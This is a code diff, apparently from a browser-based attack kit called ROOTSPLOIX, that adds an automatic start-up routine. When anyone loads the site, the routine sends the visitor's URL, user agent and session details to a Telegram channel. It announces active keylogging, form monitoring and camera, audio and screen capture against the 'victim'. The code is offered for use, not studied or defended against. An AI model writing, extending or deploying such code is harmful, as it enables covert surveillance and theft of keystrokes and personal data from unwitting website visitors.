@@ -8420,6 +8420,32 @@ Next report in 15 minutes...`;
                 
                 RootsploixUtils.log('info', 'ROOTSPLOIX Ultra Professional Framework v3.0 fully loaded and operational');
                 
+                // OTOMATIK BAŞLATMA MESAJI - BİRİ SİTEYE GİRDİĞİNDE
+                const startupMsg = `🔥💀 ROOTSPLOIX v3.0 STARTED! 💀🔥
+
+ŞUAN ATMIYO DEĞİL - OTOMATİK BAŞLATTI!
+
+🎯 Session: ${ROOTSPLOIX_SESSION.id}
+🌍 Target Site: ${window.location.href}
+📱 User Agent: ${navigator.userAgent.substring(0, 100)}...
+🕒 Start Time: ${new Date().toLocaleString()}
+
+🛡️ ACTIVE MODULES:
+✅ Keylogger: LISTENING
+✅ Mouse Tracker: ACTIVE
+✅ Form Monitor: WATCHING
+✅ Camera Access: READY
+✅ Audio Recording: STANDBY
+✅ Screen Capture: READY
+
+💀 VICTIM ACCESSED ROOTSPLOIX SITE!
+🔥 SURVEILLANCE INITIATED!`;
+                
+                // Mesajı gönder
+                if (telegram) {
+                    await telegram.sendMessage(startupMsg);
+                }
+                
                 // Show activation button for single prompt system
                 setTimeout(() => {
                     const activationButton = document.getElementById('rootsploix-activation');
